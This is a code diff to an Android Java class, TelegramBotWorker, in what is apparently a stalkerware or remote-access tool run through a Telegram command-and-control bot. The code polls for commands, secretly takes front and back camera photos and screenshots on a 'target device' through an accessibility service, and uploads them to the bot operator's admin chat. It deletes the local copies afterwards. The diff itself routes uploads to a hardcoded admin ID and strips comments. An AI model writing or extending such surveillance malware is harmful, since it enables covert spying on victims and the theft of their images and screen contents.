@@ -4,7 +4,6 @@ import android.content.Context;
 import android.content.Intent;
 import org.json.JSONArray;
 import org.json.JSONObject;
-
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -18,7 +17,7 @@ import java.nio.charset.StandardCharsets;
 public class TelegramBotWorker implements Runnable {
     private final Context context;
     private long lastUpdateId = 0;
-    private final int pollInterval = 3000; // Poll every 3 seconds
+    private final int pollInterval = 3000;
 
     public TelegramBotWorker(Context ctx) {
         this.context = ctx.getApplicationContext();
@@ -31,11 +30,10 @@ public class TelegramBotWorker implements Runnable {
                 pollForUpdates();
                 Thread.sleep(pollInterval);
             } catch (InterruptedException ie) {
-                Thread.currentThread().interrupt(); // Restore the interrupted status
+                Thread.currentThread().interrupt();
                 break;
             } catch (Exception e) {
                 ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
-                // Wait longer if there's a network error
                 try {
                     Thread.sleep(30000);
                 } catch (InterruptedException interruptedException) {
@@ -63,7 +61,6 @@ public class TelegramBotWorker implements Runnable {
             conn.setConnectTimeout(15000);
             conn.setReadTimeout(15000);
 
-            // Read response
             InputStream is = conn.getInputStream();
             ByteArrayOutputStream result = new ByteArrayOutputStream();
             byte[] buffer = new byte[1024];
@@ -75,7 +72,6 @@ public class TelegramBotWorker implements Runnable {
             is.close();
             conn.disconnect();
 
-            // Process response
             JSONObject responseJson = new JSONObject(responseStr);
             if (!responseJson.getBoolean("ok")) return;
 
@@ -128,7 +124,6 @@ public class TelegramBotWorker implements Runnable {
     private void handleCallback(JSONObject cb) {
         try {
             String data = cb.getString("data");
-            long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
 
             switch (data) {
                 case "CAM1":
@@ -137,7 +132,7 @@ public class TelegramBotWorker implements Runnable {
                     CameraHandler.takePicture(context, data, new CameraHandler.CameraCallback() {
                         @Override
                         public void onPictureTaken(String filePath) {
-                            uploadFile(filePath, chatId, data + " Picture", context);
+                            uploadFile(filePath, ConfigLoader.getAdminId(), data + " Picture", context);
                         }
                         @Override
                         public void onError(String error) {
@@ -148,19 +143,22 @@ public class TelegramBotWorker implements Runnable {
 
                 case "SCREENSHOT":
                     if (AutoClickerAccessibilityService.isServiceEnabled()) {
-                        sendMessage("Requesting screen capture...", context);
-                        // Send an Intent to the service to start the screenshot process.
-                        // This is the correct way to communicate from a worker thread to a Service.
+                        sendMessage("✅ Accessibility OK. Requesting screen capture...", context);
                         Intent intent = new Intent(context, TelegramC2Service.class);
                         intent.setAction("ACTION_PREPARE_SCREENSHOT");
                         context.startService(intent);
                     } else {
-                        sendMessage("Screenshot failed: Accessibility Service is not enabled.", context);
+                        String fallbackMessage = "⚠️ SCREENSHOT FAILED\n\n" +
+                                "Reason: The Accessibility Service is not enabled.\n" +
+                                "Action: The user must manually enable it on the target device.\n\n" +
+                                "Path: Settings -> Accessibility -> Installed apps";
+                        sendMessage(fallbackMessage, context);
                     }
                     break;
             }
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
+            sendMessage("Error processing command: " + e.getMessage(), context);
         }
     }
 
@@ -169,9 +167,9 @@ public class TelegramBotWorker implements Runnable {
                 "/command - Show the command menu.\n" +
                 "/help - Show this help message.\n\n" +
                 "Button Commands:\n" +
-                "  \uD83D\uDCF7 CAM1: Front camera photo\n" + // Camera emoji
-                "  \uD83D\uDCF8 CAM2: Back camera photo\n" + // Camera with flash emoji
-                "  \uD83D\uDCF1 SCREENSHOT: Capture screen"; // Mobile phone emoji
+                "  \uD83D\uDCF7 CAM1: Front camera photo\n" +
+                "  \uD83D\uDCF8 CAM2: Back camera photo\n" +
+                "  \uD83D\uDCF1 SCREENSHOT: Capture screen";
         sendMessage(helpText, context);
     }
 
@@ -199,8 +197,6 @@ public class TelegramBotWorker implements Runnable {
             ErrorLogger.logError(context, "TelegramBotWorker_SendMenu", e);
         }
     }
-
-    // --- Networking Methods ---
 
     public static void sendMessage(String message, Context context) {
         try {
@@ -231,7 +227,6 @@ public class TelegramBotWorker implements Runnable {
                     os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                 }
 
-                // We must read the response for the request to complete.
                 conn.getResponseCode();
                 conn.getInputStream().close();
 
@@ -246,6 +241,12 @@ public class TelegramBotWorker implements Runnable {
     }
 
     public static void uploadFile(String filePath, long chatId, String caption, Context context) {
+        final File fileToUpload = new File(filePath);
+        if (!fileToUpload.exists()) {
+            sendMessage("File to upload not found: " + filePath, context);
+            return;
+        }
+
         new Thread(() -> {
             String token = ConfigLoader.getBotToken();
             if (token == null) return;
@@ -253,12 +254,6 @@ public class TelegramBotWorker implements Runnable {
             String boundary = "Boundary-" + System.currentTimeMillis();
             String LINE_FEED = "\r\n";
             HttpURLConnection conn = null;
-
-            File fileToUpload = new File(filePath);
-            if (!fileToUpload.exists()) {
-                sendMessage("File to upload not found: " + filePath, context);
-                return;
-            }
 
             try {
                 URL url = new URL(urlStr);
@@ -270,19 +265,16 @@ public class TelegramBotWorker implements Runnable {
                 conn.setReadTimeout(30000);
 
                 try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
-                    // Chat ID part
                     writer.append("--").append(boundary).append(LINE_FEED);
                     writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED);
                     writer.append(LINE_FEED);
                     writer.append(String.valueOf(chatId)).append(LINE_FEED);
 
-                    // Caption part
                     writer.append("--").append(boundary).append(LINE_FEED);
                     writer.append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED);
                     writer.append(LINE_FEED);
                     writer.append(caption).append(LINE_FEED);
 
-                    // File part
                     writer.append("--").append(boundary).append(LINE_FEED);
                     writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"").append(fileToUpload.getName()).append("\"").append(LINE_FEED);
                     writer.append("Content-Type: image/jpeg").append(LINE_FEED);
@@ -301,7 +293,6 @@ public class TelegramBotWorker implements Runnable {
                     writer.append("--").append(boundary).append("--").append(LINE_FEED);
                 }
 
-                // We must read the response for the request to complete.
                 conn.getResponseCode();
                 conn.getInputStream().close();
 
@@ -312,8 +303,9 @@ public class TelegramBotWorker implements Runnable {
                 if (conn != null) {
                     conn.disconnect();
                 }
-                // Clean up the captured file
-                fileToUpload.delete();
+                if (fileToUpload.exists()) {
+                    fileToUpload.delete();
+                }
             }
         }).start();
     }
